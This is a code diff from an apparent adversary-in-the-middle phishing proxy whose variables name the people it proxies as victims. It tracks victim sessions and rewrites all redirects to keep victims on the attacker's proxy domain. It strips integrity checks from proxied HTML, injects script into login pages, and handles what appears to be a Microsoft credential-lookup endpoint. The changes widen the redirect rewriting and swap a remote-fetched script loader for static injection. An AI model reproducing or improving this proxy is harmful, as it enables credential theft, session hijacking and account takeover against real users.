@@ -392,32 +392,33 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
         // ---- REDIRECT DEBUG LOG ----
         console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);
 
-        if (isNavigationRequest &&
-            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
-            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+        // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
+if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+    const proxyResponseLocation = proxyResponse.headers.location;
+    if (proxyResponseLocation) {
+        try {
+            const locationURL = new URL(proxyResponseLocation);
+            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
+            
+            // Update session to the target host (important for subsequent requests)
+            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
+            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+            VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
+            VICTIM_SESSIONS[currentSession].port = locationURL.port;
+            VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
-            const proxyResponseLocation = proxyResponse.headers.location;
-            if (proxyResponseLocation) {
-                try {
-                    const locationURL = new URL(proxyResponseLocation);
-                    console.log(`[REDIRECT REWRITE] Original Location: ${proxyResponseLocation}`);
-                    VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-                    VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-                    VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-                    VICTIM_SESSIONS[currentSession].port = locationURL.port;
-                    VICTIM_SESSIONS[currentSession].host = locationURL.host;
-
-                    const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-                    proxyResponse.headers.location = rewritten;
-                    console.log(`[REDIRECT REWRITE] Rewritten Location: ${rewritten}`);
-                } catch {
-                    VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
-                    console.log(`[REDIRECT REWRITE] Failed to parse Location, set path to: ${proxyResponseLocation}`);
-                }
-            }
-        } else {
-            console.log(`[REDIRECT SKIP] Condition not met for rewrite.`);
+            // Rewrite Location to point back to your proxy domain
+            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+            proxyResponse.headers.location = rewritten;
+            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
+        } catch (error) {
+            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
+            console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
         }
+    }
+} else if (proxyResponse.statusCode > 400) {
+    displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
+}
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
         if (proxyResponseCookie) {
@@ -441,50 +442,29 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
                 serverResponseBody = Buffer.concat(serverResponseBody);
 
                 if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
-                    Buffer.byteLength(serverResponseBody)) {
-                    try {
-                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                        let html = decompressedResponseBody.toString('utf8');
-
-                        // ---- SRI (Integrity) Removal ----
-                        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
-                        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
-                        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-
-                        // ---- Dynamic script injection ----
-                        const dynamicCode = `
-<script>
-  (async function() {
+    Buffer.byteLength(serverResponseBody)) {
     try {
-      const resp = await fetch('${PROXY_PATHNAMES.script}');
-      const code = await resp.text();
-      const blob = new Blob([code], { type: 'application/javascript' });
-      const url = URL.createObjectURL(blob);
-      await import(url);
-    } catch(e) {
-      console.error('Dynamic script injection failed', e);
+        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
+
+        // ---- SRI (Integrity) Removal ----
+        let html = decompressedResponseBody.toString('utf8');
+        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+        const cleanedBuffer = Buffer.from(html);
+
+        // ---- STATIC injection (original method) ----
+        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
+        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
+
+        if (proxyResponse.headers["content-length"]) {
+            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
+        }
     }
-  })();
-</script>`;
-                        if (html.includes('</head>')) {
-                            html = html.replace('</head>', dynamicCode + '</head>');
-                        } else if (html.includes('</body>')) {
-                            html = html.replace('</body>', dynamicCode + '</body>');
-                        } else {
-                            html = dynamicCode + html;
-                        }
-
-                        serverResponseBody = Buffer.from(html);
-                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
-
-                        if (proxyResponse.headers["content-length"]) {
-                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
-                        }
-                    }
-                    catch (error) {
-                        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
-                    }
-                }
+    catch (error) {
+        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
+    }
+}
                 else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                     try {
                         const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
